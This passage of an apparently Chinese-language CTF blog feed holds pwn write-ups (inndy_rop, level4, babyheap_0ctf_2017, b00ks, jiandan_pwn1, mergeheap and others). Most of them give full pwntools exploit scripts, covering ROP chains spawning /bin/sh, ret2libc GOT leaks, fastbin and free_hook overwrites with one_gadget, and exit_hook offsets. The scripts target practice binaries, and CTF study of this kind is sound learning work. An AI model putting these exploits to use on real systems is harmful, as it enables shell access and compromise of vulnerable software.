        <content type="html"><![CDATA[<h5 id="初遇srop"><a href="#初遇srop" class="headerlink" title="初遇srop"></a>初遇srop</h5><p><img src="https://i0.imgs.ovh/2024/03/17/e3xQs.png" alt="image-20240318211119440"></p><p><img src="https://i0.imgs.ovh/2024/03/17/e3KTX.png" alt="image-20240318211144301"></p><p>unix在系统发生signal时会间接调用sigreturn,ucontext,siginfo等会被压入栈中,这一段称为signal frame</p><p><img src="https://i0.imgs.ovh/2024/03/17/e3olU.png" alt="image-20240318212003314"></p><p>要用srop，需满足几个条件</p><p>可以通过栈溢出控制栈的内容。</p><p>需要知道相应的地址。</p><pre><code>     “/bin/sh”</code></pre><p>​        Signal Frame</p><p>​        syscall</p><p>​        sigreturn</p><p>题目中已经给了我们gadgets的地址</p><p>首先可以打印出栈地址</p><p><img src="https://i0.imgs.ovh/2024/03/17/e3QBm.png" alt="image-20240318213204641"></p><p>其次返回地址写上了0x4004F1,打印完会再次返回func函数</p><p><img src="https://i0.imgs.ovh/2024/03/17/e3cvR.png" alt="image-20240318214547353"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hitcon2014_stkof</title>
      <link href="/2024/03/16/hitcon2014-stkof/"/>
      <url>/2024/03/16/hitcon2014-stkof/</url>
      
        <content type="html"><![CDATA[<h5 id="偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink"><a href="#偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink" class="headerlink" title="偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink"></a>偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink</h5><pre><code class="lang-py">add(0x30) #1add(0x30) #2add(0x80) #3add(0x30) #4bss=0x602140+0x10fd=bss-0x18bk=bss-0x10payload=p32(0)+p32(0x30)payload+=p64(fd)+p64(bk)payload+=p64(0)*2payload+=p64(0x30)+p64(0x90)edit(2,payload)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/15/eVoRI.png" alt="image-20240316223611733"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>inndy_rop</title>
      <link href="/2024/03/14/inndy-rop/"/>
      <url>/2024/03/14/inndy-rop/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/13/chENt.png" alt="image-20240314194629081"></p><p>除了个gets函数啥也没有了</p><p><img src="https://i0.imgs.ovh/2024/03/13/chDtC.png" alt="image-20240314194446848"></p><h5 id="直接-ROPgadget-—binary-inndy-rop-—ropchain"><a href="#直接-ROPgadget-—binary-inndy-rop-—ropchain" class="headerlink" title="直接 ROPgadget —binary inndy_rop —ropchain"></a>直接 ROPgadget —binary inndy_rop —ropchain</h5><p><img src="https://i0.imgs.ovh/2024/03/13/chqwm.png" alt="image-20240314194655817"></p><pre><code class="lang-py">from pwn import*from struct import packfrom LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)r=process(&quot;./inndy_rop&quot;)context.log_level=&quot;debug&quot;p=b&#39;a&#39;*(0xc+4)p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .datap += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; retp += b&#39;/bin&#39;p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4p += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; retp += b&#39;//sh&#39;p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; retp += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .datap += pack(&#39;&lt;I&#39;, 0x080de769) # pop ecx ; retp += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0806c943) # int 0x80#gdb.attach(p)#sleep(1)r.sendline(p)r.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>level4</title>
      <link href="/2024/03/14/level4/"/>
      <url>/2024/03/14/level4/</url>
      
        <content type="html"><![CDATA[<p>只开了NX保护，32位栈溢出。</p><pre><code class="lang-py">elf = ELF(proc_name)write_plt = elf.plt[&#39;write&#39;]write_got = elf.got[&#39;write&#39;]main_addr = elf.sym[&#39;main&#39;]payload = b&#39;a&#39; * (0x88 + 0x4) + p32(write_plt) + p32(main_addr) + p32(0x1) + p32(write_got) + p32(0x4)</code></pre><h5 id="没调用write函数前"><a href="#没调用write函数前" class="headerlink" title="没调用write函数前"></a>没调用write函数前</h5><p><img src="https://i0.imgs.ovh/2024/03/13/c6Qi2.png" alt="image-20240314145631680"></p><h5 id="got表存的是寻址的地址"><a href="#got表存的是寻址的地址" class="headerlink" title="got表存的是寻址的地址"></a>got表存的是寻址的地址<img src="https://i0.imgs.ovh/2024/03/13/c6JpW.png" alt="image-20240314145743045"></h5><h5 id="跳转到write-got存的地址write-plt-6"><a href="#跳转到write-got存的地址write-plt-6" class="headerlink" title="跳转到write_got存的地址write_plt+6"></a>跳转到write_got存的地址write_plt+6</h5><p><img src="https://i0.imgs.ovh/2024/03/13/c64s9.png" alt="image-20240314145920863"></p><p><img src="https://i0.imgs.ovh/2024/03/13/c6dVH.png" alt="image-20240314150124101"></p><p><img src="https://i0.imgs.ovh/2024/03/13/c65iO.png" alt="image-20240314150041605"></p><p><img src="https://i0.imgs.ovh/2024/03/13/c6yjC.png" alt="image-20240314150231093"></p><p><img src="https://i0.imgs.ovh/2024/03/13/cWPVt.png" alt="image-20240314150335322"></p><p><img src="https://i0.imgs.ovh/2024/03/13/cWVkm.png" alt="image-20240314150533997"></p><h5 id="总结起来就是，没调用write函数之前，write-got存的是write-plt-6这个地址，然后执行write-plt会去write-got里找write函数真正的地址，此时会执行write-plt-6这个地址寻址，找到write函数真正的地址后会把它存入write-got"><a href="#总结起来就是，没调用write函数之前，write-got存的是write-plt-6这个地址，然后执行write-plt会去write-got里找write函数真正的地址，此时会执行write-plt-6这个地址寻址，找到write函数真正的地址后会把它存入write-got" class="headerlink" title="总结起来就是，没调用write函数之前，write_got存的是write_plt+6这个地址，然后执行write_plt会去write_got里找write函数真正的地址，此时会执行write_plt+6这个地址寻址，找到write函数真正的地址后会把它存入write_got."></a>总结起来就是，没调用write函数之前，write_got存的是write_plt+6这个地址，然后执行write_plt会去write_got里找write函数真正的地址，此时会执行write_plt+6这个地址寻址，找到write函数真正的地址后会把它存入write_got.</h5><p><img src="https://i0.imgs.ovh/2024/03/13/cW2wp.png" alt="image-20240314151444152"></p><p><img src="https://i0.imgs.ovh/2024/03/13/cWnxd.png" alt="image-20240314152016165"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;proc_name = &#39;./level4&#39;p = process(proc_name)#p=remote(&#39;node5.buuoj.cn&#39;,29402)                                                                                                                                                   elf = ELF(proc_name)write_plt = elf.plt[&#39;write&#39;]write_got = elf.got[&#39;write&#39;]main_addr = elf.sym[&#39;main&#39;]payload = b&#39;a&#39; * (0x88 + 0x4) + p32(write_plt) + p32(main_addr) + p32(0x1) + p32(write_got) + p32(0x4)gdb.attach(p)sleep(1)p.send(payload)write_addr = u32(p.recv(4))print(hex(write_addr))#libc = LibcSearcher(&#39;write&#39;, write_addr)libc=ELF(&#39;./libc-2.23_32.so&#39;)libc_base = write_addr - libc.sym[&#39;write&#39;]system_addr = libc_base + libc.sym[&#39;system&#39;]str_bin_sh = libc_base + next(libc.search(b&#39;bin/sh&#39;))payload1 = b&#39;a&#39; * (0x88 + 0x4) + p32(system_addr) + p32(main_addr) + p32(str_bin_sh)p.send(payload1)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/2024/03/13/babyheap-0ctf-2017/"/>
      <url>/2024/03/13/babyheap-0ctf-2017/</url>
      
        <content type="html"><![CDATA[<p>保护全开</p><h5 id="malloc-add都整得挺抽象的，但都大同小异。这道题还是挺有难度的"><a href="#malloc-add都整得挺抽象的，但都大同小异。这道题还是挺有难度的" class="headerlink" title="malloc,add都整得挺抽象的，但都大同小异。这道题还是挺有难度的"></a>malloc,add都整得挺抽象的，但都大同小异。这道题还是挺有难度的</h5><p>有个填充的时候的size可以大于自己申请的，有个堆溢出漏洞。</p><p><img src="https://i0.imgs.ovh/2024/03/12/cnbtX.png" alt="image-20240313194053956"></p><p>尝试改下个堆的size，再释放，再malloc，会报错，这个方法不行。</p><p><img src="https://i0.imgs.ovh/2024/03/12/cHClH.png" alt="image-20240313202940866"></p><p>改掉了bin指针</p><p><img src="https://i0.imgs.ovh/2024/03/12/cHpbm.png" alt="image-20240313205043694"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cH61T.png" alt="image-20240313205752854"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHgnO.png" alt="image-20240313221321740"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHsn2.png" alt="image-20240313212014082"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHcT9.png" alt="image-20240313221044009"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHtoH.png" alt="image-20240313221647152"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHjys.png" alt="image-20240313222042253"></p><h5 id="堆2是指向free-chunk的，填充堆2也就是在fast-bin的指针上写上malloc-hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。"><a href="#堆2是指向free-chunk的，填充堆2也就是在fast-bin的指针上写上malloc-hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。" class="headerlink" title="堆2是指向free_chunk的，填充堆2也就是在fast_bin的指针上写上malloc_hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。"></a>堆2是指向free_chunk的，填充堆2也就是在fast_bin的指针上写上malloc_hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。</h5><p><img src="https://i0.imgs.ovh/2024/03/12/cHymu.png" alt="image-20240313230951923"></p><h5 id="在malloc-hook-0x23的地址上，dword-malloc-hook-0x23-0x8-这个地址的值是0x7f-满足0x70大小的fastbin的大小，所以malloc-hook-0x23这个地址可以当作fake-addr-再填充0x13字节到malloc-hook-写上one-gadget"><a href="#在malloc-hook-0x23的地址上，dword-malloc-hook-0x23-0x8-这个地址的值是0x7f-满足0x70大小的fastbin的大小，所以malloc-hook-0x23这个地址可以当作fake-addr-再填充0x13字节到malloc-hook-写上one-gadget" class="headerlink" title="在malloc_hook-0x23的地址上，dword(malloc_hook-0x23+0x8)这个地址的值是0x7f,满足0x70大小的fastbin的大小，所以malloc_hook-0x23这个地址可以当作fake_addr,再填充0x13字节到malloc_hook,写上one_gadget."></a>在malloc_hook-0x23的地址上，dword(malloc_hook-0x23+0x8)这个地址的值是0x7f,满足0x70大小的fastbin的大小，所以malloc_hook-0x23这个地址可以当作fake_addr,再填充0x13字节到malloc_hook,写上one_gadget.</h5><p><img src="https://i0.imgs.ovh/2024/03/13/cf7Ou.png" alt="image-20240314130240170"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,26041)p=process(&quot;./babyheap_0ctf_2017&quot;)context.log_level=&quot;debug&quot;context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)libc=ELF(&#39;./libc-2.23.so&#39;)def add(size):    p.sendlineafter(&#39;Command: &#39;,&#39;1&#39;)    p.sendlineafter(&#39;Size: &#39;,str(size))def full(index,size,content):    p.sendlineafter(&#39;Command: &#39;,&#39;2&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))    p.sendlineafter(&#39;Size: &#39;,str(size))    p.sendlineafter(&#39;Content: &#39;,content)def free(index):    p.sendlineafter(&#39;Command: &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))def show(index):    p.sendlineafter(&#39;Command: &#39;,&#39;4&#39;)    p.sendlineafter(&#39;Index:&#39;,str(index))add(0x10) #0 add(0x10) #1add(0x10) #2add(0x10) #3add(0x80) #4free(1)free(2)payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x20)+p8(0x80)full(0,0x41,payload)payload=p64(0)*3+p64(0x21)full(3,0x20,payload)add(0x10) #1add(0x10) #2--&gt;4payload=p64(0)*3+p64(0x91)full(3,0x20,payload)add(0x30) #防止合并free(4)show(2)p.recvuntil(&quot;Content:&quot;)main_addr=u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-88print(hex(main_addr))base=main_addr-0x10-libc.sym[&#39;__malloc_hook&#39;]system=base+libc.sym[&#39;system&#39;]add(0x60) #4free(4)fake_addr=main_addr-0x10-0x23full(2,0x8,p64(fake_addr))&#39;&#39;&#39;orpayload=p64(0)*3+p64(0x71)+p64(fake_addr)full(3,0x28,payload)&#39;&#39;&#39;gdb.attach(p)sleep(1)add(0x60) #5add(0x60) #6one=[0x45216,0x4526a,0xf02a4,0xf1147]one_gadget=base+one[1]payload=b&#39;a&#39;*0x13+p64(one_gadget)full(6,0x1b,payload)add(0x10)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2019_login</title>
      <link href="/2024/03/12/SWPUCTF-2019-login/"/>
      <url>/2024/03/12/SWPUCTF-2019-login/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/12/c2zXv.png" alt="image-20240313150317142"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>STKOF</title>
      <link href="/2024/03/11/stkof/"/>
      <url>/2024/03/11/stkof/</url>
      
        <content type="html"><![CDATA[<h5 id="两道程序题，一道32位一道64位，都是栈溢出的题"><a href="#两道程序题，一道32位一道64位，都是栈溢出的题" class="headerlink" title="两道程序题，一道32位一道64位，都是栈溢出的题"></a>两道程序题，一道32位一道64位，都是栈溢出的题</h5><p><img src="https://i0.imgs.ovh/2024/03/10/R2zsu.png" alt="image-20240311205640177"></p><p><img src="https://i0.imgs.ovh/2024/03/10/R2t8p.png" alt="image-20240311205417765"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>b00ks</title>
      <link href="/2024/03/11/b00ks/"/>
      <url>/2024/03/11/b00ks/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/10/RPetI.png" alt="image-20240311142425453"></p><h5 id="甩到脸上的off-by-one"><a href="#甩到脸上的off-by-one" class="headerlink" title="甩到脸上的off-by-one"></a>甩到脸上的off-by-one</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RPckj.png" alt="image-20240311141823683"></p><h5 id="是一个图书管理系统"><a href="#是一个图书管理系统" class="headerlink" title="是一个图书管理系统"></a>是一个图书管理系统</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RP1wJ.png" alt="image-20240311142646867"></p><h5 id="这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作"><a href="#这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作" class="headerlink" title="这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作"></a>这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RPiZe.png" alt="image-20240311142945990"></p><p><img src="https://i0.imgs.ovh/2024/03/10/RPJOW.png" alt="image-20240311142840161"></p><h5 id="打印的时候会连堆地址也打印出来"><a href="#打印的时候会连堆地址也打印出来" class="headerlink" title="打印的时候会连堆地址也打印出来"></a>打印的时候会连堆地址也打印出来</h5><pre><code class="lang-py">add(0x80,&#39;cccccccc&#39;,0x60,&#39;dddddddd&#39;)add(0x10,&#39;eeeeeeee&#39;,0x10,&#39;ffffffff&#39;)free(2)edit(1,p64(1)+p64(heap_addr+0x30)+p64(heap_addr+0x30+0x90+0xe0+0x10)+p64(0x20))</code></pre><p><img src="https://i0.imgs.ovh/2024/03/10/RV2Qp.png" alt="image-20240311151905833"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node5.buuoj.cn&quot;,25494)#p=process(&quot;./b00ks&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.23.so&#39;)elf=ELF(&#39;./b00ks&#39;)payload=b&#39;k&#39;*0x1f+b&#39;b&#39;p.sendlineafter(&#39;Enter author name: &#39;,payload)def add(size1,content1,size2,content2):    p.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;)    p.sendlineafter(&#39;Enter book name size:&#39;,str(size1))    p.sendlineafter(&#39;Enter book name (Max 32 chars):&#39;,content1)    p.sendlineafter(&#39;Enter book description size:&#39;,str(size2))    p.sendlineafter(&#39;Enter book description:&#39;,content2)def edit(idd,content):    p.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Enter the book id you want to edit: &#39;,str(idd))    p.sendlineafter(&#39;Enter new book description: &#39;,content)def show():    p.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)def free(idd):    p.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;)    p.sendlineafter(&#39;Enter the book id you want to delete: &#39;,str(idd))def ren(content):    p.sendlineafter(&#39;&gt; &#39;,&#39;5&#39;)    p.sendlineafter(&#39;Enter author name: &#39;,content)add(0xd0,&#39;aaaaaaaa&#39;,0x20,&#39;bbbbbbb&#39;) #1show()p.recvuntil(&quot;kb&quot;)heap_addr=u64(p.recv(6)[-6:].ljust(8,b&#39;\x00&#39;))print(&#39;addr&#39;+hex(heap_addr))add(0x80,&#39;cccccccc&#39;,0x60,&#39;dddddddd&#39;) #2 add(0x10,&#39;bin/sh&#39;,0x10,&#39;ffffffff&#39;) #3free(2)edit(1,p64(1)+p64(heap_addr+0x30)+p64(heap_addr+0x30+0x90+0xe0+0x10)+p64(0x20))ren(&#39;a&#39;*0x20)show()p.recvuntil(&#39;Name: &#39;)main_addr=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))-88malloc_hook=main_addr-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]system=base+libc.sym[&#39;system&#39;]print(&#39;main_addr&#39;+hex(main_addr))edit(1,p64(free_hook)+p64(0x20))edit(3,p64(system))free(3)#gdb.attach(p)sleep(1)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>freenote_x64</title>
      <link href="/2024/03/10/freenote-x64/"/>
      <url>/2024/03/10/freenote-x64/</url>
      
        <content type="html"><![CDATA[<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240310205447683.png" alt="image-20240310205447683"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jiandan_pwn1</title>
      <link href="/2024/03/09/jiandan-pwn1/"/>
      <url>/2024/03/09/jiandan-pwn1/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/08/QEhHH.png" alt="image-20240309170306025"></p><h5 id="一个字节一个字节输入，然后v4在rbp-4的位置，直接发送p32-0x10d-0d先放在左边-x61-的位置，然后把值放到rsp-0x10d的位置，后面的输入也不影响v4的值。"><a href="#一个字节一个字节输入，然后v4在rbp-4的位置，直接发送p32-0x10d-0d先放在左边-x61-的位置，然后把值放到rsp-0x10d的位置，后面的输入也不影响v4的值。" class="headerlink" title="一个字节一个字节输入，然后v4在rbp-4的位置，直接发送p32(0x10d),0d先放在左边(\x61)的位置，然后把值放到rsp+0x10d的位置，后面的输入也不影响v4的值。"></a>一个字节一个字节输入，然后v4在rbp-4的位置，直接发送p32(0x10d),0d先放在左边(\x61)的位置，然后把值放到rsp+0x10d的位置，后面的输入也不影响v4的值。</h5><p><img src="https://i0.imgs.ovh/2024/03/08/QEsoD.png" alt="image-20240309172253099"></p><p><img src="https://i0.imgs.ovh/2024/03/08/QExYo.png" alt="image-20240309170455669"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,27841)p=process(&quot;./jiandan_pwn1&quot;)context.log_level=&quot;debug&quot;puts_func=0x4007BFputs_plt=0x400590puts_got=0x601018pop_rdi=0x400843libc=ELF(&#39;./libc-2.23.so&#39;)gdb.attach(p,&#39;b *0x400783&#39;)sleep(1)payload=b&#39;a&#39;*(0x110-4)+p32(0x10d)+b&#39;a&#39;*8+p64(pop_rdi)+p64(puts_got)+p64(puts_func)p.sendlineafter(&#39;Hack 4 fun!&#39;,payload)puts_got=u64(p.recvuntil(&#39;\x7f&#39;).strip().ljust(8,b&#39;\x00&#39;))base=puts_got-libc.sym[&#39;puts&#39;]system=base+libc.sym[&#39;system&#39;]binsh=base+next(libc.search(b&#39;bin/sh&#39;))print(&#39;puts&#39;+hex(puts_got))#payload=b&#39;a&#39;*(0x110-4)+p32(0x10d)+b&#39;a&#39;*8+p64(pop_rdi)+p64(binsh)+p64(system)p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mergeheap</title>
      <link href="/2024/03/08/mergeheap/"/>
      <url>/2024/03/08/mergeheap/</url>
      
        <content type="html"><![CDATA[<p>保护全开，libc-2.27,malloc大小限制了0x400，有个合并堆的函数，可以合并大于0x400的，不过释放的时候总是和top_chunk合并。所以得用另一种方法泄露libc.</p><p><img src="https://i0.imgs.ovh/2024/03/08/QYjEN.png" alt="image-20240308204851522"></p><pre><code class="lang-py">add(0x210,&#39;aaaa&#39;)add(0x210,&#39;cccc&#39;)add(0x10,&#39;dddd&#39;)merge(0,1)free(3)free(2)</code></pre><h5 id="这种方法好像不行"><a href="#这种方法好像不行" class="headerlink" title="这种方法好像不行"></a>这种方法好像不行</h5><pre><code class="lang-py">for i in range(8):    add(0x80,&#39;cccc&#39;)for i in range(1,8):     free(i)free(0)add(0x8,&#39;cccccccc&#39;)show(0)p.recvuntil(&#39;cccccccc&#39;)main_addr=u64(p.recvuntil(b&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))</code></pre><pre><code class="lang-py">add(0x60,&#39;aaaa\n&#39;) #1add(0x30,&#39;a&#39;*0x30) #2add(0x38,&#39;a&#39;*0x38) #3add(0x100,&#39;a&#39;)       #4add(0x68,&#39;a&#39;)      #5add(0x20,&#39;a&#39;)       #6add(0x20,&#39;c&#39;)      #7add(0x20,&#39;f&#39;)      #8add(0x20,&#39;d&#39;)      #9</code></pre><pre><code class="lang-py">free(5)free(7)free(8)</code></pre><pre><code class="lang-py">merge(2,3)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/08/QY5lR.png" alt="image-20240309145439198"></p><h5 id="下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂"><a href="#下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂" class="headerlink" title="下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂"></a>下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂</h5><p><img src="https://i0.imgs.ovh/2024/03/08/QYYbp.png" alt="image-20240309150323508"></p><pre><code class="lang-py">free(6)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/08/QYDXu.png" alt="image-20240309150602685"></p><p><img src="https://i0.imgs.ovh/2024/03/08/QYEBl.png" alt="image-20240309151308724"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,25860)p=process(&quot;./mergeheap&quot;)context.log_level=&quot;debug&quot;context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)libc=ELF(&#39;./libc-2.27.so&#39;)def add(size,content):    p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;1&#39;)    p.sendlineafter(&#39;len:&#39;,str(size))    p.sendlineafter(&#39;content:&#39;,content)def show(index):    p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;2&#39;)    p.sendlineafter(&#39;idx:&#39;,str(index))def free(index):    p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;3&#39;)    p.sendlineafter(&#39;idx:&#39;,str(index))def merge(index1,index2):    p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;4&#39;)    p.sendlineafter(&#39;idx1:&#39;,str(index1))    p.sendlineafter(&#39;idx2:&#39;,str(index2))for i in range(8):    add(0x80,&#39;cccc&#39;)for i in range(1,8):     free(i)free(0)add(0x8,&#39;cccccccc&#39;)show(0)p.recvuntil(&#39;cccccccc&#39;)main_addr=u64(p.recvuntil(b&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))print(hex(main_addr-0x80))main_arena=main_addr-96-0x80malloc=main_arena-0x10base=malloc-libc.sym[&#39;__malloc_hook&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]one=[0x4f2c5,0x4f322,0x10a38c]one_gadget=base+one[1]add(0x60,&#39;aaaa\n&#39;) #1add(0x30,&#39;a&#39;*0x30) #2add(0x38,&#39;a&#39;*0x38) #3add(0x100,&#39;a&#39;)       #4add(0x68,&#39;a&#39;)      #5add(0x20,&#39;a&#39;)       #6add(0x20,&#39;c&#39;)      #7add(0x20,&#39;f&#39;)      #8add(0x20,&#39;d&#39;)      #9free(5)free(7)free(8)merge(2,3)free(6)payload=b&#39;a&#39;*0x28+p64(0x31)+p64(free_hook)+p64(0)add(0x100,payload)add(0x20,&#39;aaaa&#39;)add(0x20,&#39;cccc&#39;)add(0x20,p64(one_gadget))free(9)#gdb.attach(p)sleep(1)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bbctf_2020_write</title>
      <link href="/2024/03/08/bbctf-2020-write/"/>
      <url>/2024/03/08/bbctf-2020-write/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/07/QUp53.png" alt="image-20240308192349360"></p><p><img src="https://i0.imgs.ovh/2024/03/07/QUMbe.png" alt="image-20240308192110221"> </p><h5 id="可以泄露了puts-got-可以算偏移，程序可以改地址的内容，那么可以改exit-hook-exit函数会执行run-exit-handlers，然后这个函数会调用-dl-fini，然后这个-dl-fini的源码调用了-rtld-lock-lock-recursive-和-rtld-lock-unlock-recursive，所以只需要向其中一个写入one-gadget就行了。"><a href="#可以泄露了puts-got-可以算偏移，程序可以改地址的内容，那么可以改exit-hook-exit函数会执行run-exit-handlers，然后这个函数会调用-dl-fini，然后这个-dl-fini的源码调用了-rtld-lock-lock-recursive-和-rtld-lock-unlock-recursive，所以只需要向其中一个写入one-gadget就行了。" class="headerlink" title="可以泄露了puts_got,可以算偏移，程序可以改地址的内容，那么可以改exit_hook,exit函数会执行run_exit_handlers，然后这个函数会调用_dl_fini，然后这个_dl_fini的源码调用了 rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive，所以只需要向其中一个写入one_gadget就行了。"></a>可以泄露了puts_got,可以算偏移，程序可以改地址的内容，那么可以改exit_hook,exit函数会执行<strong>run_exit_handlers，然后这个函数会调用_dl_fini，然后这个_dl_fini的源码调用了 </strong>rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive，所以只需要向其中一个写入one_gadget就行了。</h5><h5 id="为了以后方便，以后就这样算"><a href="#为了以后方便，以后就这样算" class="headerlink" title="为了以后方便，以后就这样算"></a>为了以后方便，以后就这样算</h5><p><strong>在libc-2.23中</strong><br><strong>exit_hook = libc_base+0x5f0040+3848</strong></p><p><strong>exit_hook = libc_base+0x5f0040+3856</strong></p><p><strong>在libc-2.27中</strong></p><p><strong>exit_hook = libc_base+0x619060+3840</strong></p><h5 id="exit-hook-libc-base-0x619060-3848"><a href="#exit-hook-libc-base-0x619060-3848" class="headerlink" title="exit_hook = libc_base+0x619060+3848"></a>exit_hook = 